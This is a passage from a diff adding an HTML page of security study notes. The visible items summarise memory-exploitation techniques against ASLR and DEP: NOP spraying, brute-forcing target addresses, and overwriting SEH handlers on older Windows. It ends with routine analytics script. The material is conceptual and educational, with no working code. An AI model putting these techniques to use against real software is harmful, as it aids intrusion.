+                    <li><span><strong>NOP spray</strong>: Create a big block of NOPs to increase chance of jump landing on legit memory. Difficult, but possible even when all modules are ASLR-enabled. Won't work if DEP is switched on though.</span></li>
+                    <li><span><strong>Bruteforce</strong>: If you can try an exploit with a vulnerability that doesn't make the program crash, you can bruteforce 256 different target addresses until it works.</span></li>
+                    <li><span><strong>Structured Exception Handling (SEH)</strong> Is the normal exception handling (try/catch blocks). Up to windows XP the handlers used to be registered in the stack and an attacker could overwrite them.</span></li>
+                </ul>
+        </fieldset>
+    <script>new Highlighter().run(document);</script>
+    <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m = s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-106217827-1', 'auto'); ga('send', 'pageview'); </script>
+    
+</body></html>
